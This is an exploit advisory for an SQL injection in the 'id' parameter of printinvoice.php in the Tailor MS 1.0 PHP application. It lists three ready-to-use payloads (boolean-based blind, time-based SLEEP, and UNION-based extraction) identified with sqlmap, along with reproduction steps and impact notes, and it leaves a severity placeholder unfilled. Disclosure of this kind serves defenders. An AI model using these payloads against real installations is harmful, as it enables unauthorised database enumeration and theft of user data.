# Exploit Title: Tailor MS – SQL Injection in printinvoice.php (`http://localhost/tailor/printinvoice.php?id=1`)

**Date:** 2025-08-11  
**Exploit Author:** Anonymous  
**Vendor Homepage:** https://www.sourcecodester.com  
**Software Link:** //www.sourcecodester.com/sites/default/files/download/Warren%20Daloyan/tailor.zip  
**Version:** 1.0  
**Tested on:** PHP 7.4 on Ubuntu 20.04  

---

## Summary

A SQL Injection vulnerability exists in the `printinvoice.php` endpoint of **Tailor MS**. Unsanitized user input in the specified parameter is interpolated directly into an SQL query, allowing attackers to infer or extract data and, in some cases, execute stacked/time-based payloads.  
**Back-end DBMS (as detected):** MySQL >= 5.0.12 (MariaDB fork)  
**CWE:** CWE-89 (SQL Injection)  
**Severity:** High (placeholder — adjust once CVSS is computed)

## Affected Component & Parameter

### Affected Endpoint

- **URL:** `http://localhost/tailor/printinvoice.php?id=1`
- **HTTP Method:** GET
- **Vulnerable File:** `printinvoice.php`
- **Parameter:** `id`
- **Vector Location:** GET

### Injection Techniques (as identified by sqlmap)
- **Type:** boolean-based blind
  - **Title:** AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
  - **Payload:** `id=1' AND 6143=(SELECT (CASE WHEN (6143=6143) THEN 6143 ELSE (SELECT 5117 UNION SELECT 1921) END))-- -`
- **Type:** time-based blind
  - **Title:** MySQL >= 5.0.12 AND time-based blind (query SLEEP)
  - **Payload:** `id=1' AND (SELECT 4224 FROM (SELECT(SLEEP(5)))rWLE)-- toRz`
- **Type:** UNION query
  - **Title:** Generic UNION query (NULL) - 10 columns
  - **Payload:** 
```
id=1' UNION ALL SELECT NULL,NULL,CONCAT(0x7170766271,0x58654a4276784274716273646a4d665751456b414570477859754164596a77556e67704950567669,0x717a767a71),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -
```



## Proof of Concept (Burp Repeater)

![burp-repeater-poc](poc.png)

## SQLMap Summary

![sqlmap-summary](sqlmap_summary.png)



## Technical Description

The vulnerable parameter is reflected into the SQL statement without proper validation or prepared statements. Boolean-based blind, time-based blind (SLEEP), and/or UNION-based vectors were verified by sqlmap. This enables database enumeration and potential data exfiltration under the privileges of the application’s DB user.

## Impact

- Enumeration of database schemas, tables, and rows  
- Exposure of sensitive user/operational data  
- Potential lateral movement if credentials or session material are stored in DB

## Steps to Reproduce

1. Browse to `http://localhost/tailor/printinvoice.php?id=1`.  
2. Intercept the request and inject the provided payload(s) into parameter `printinvoice.php?&<param>=...`.  
3. Observe conditional responses / time delays / injected row reflections per technique above.  
4. Confirm DBMS fingerprinting and data extraction as permitted by the app’s DB privileges.

## Vulnerable Code (Screenshot)

![vulnerable-code](code_snippet.png)


References
OWASP: SQL Injection Prevention Cheat Sheet

CWE-89: SQL Injection
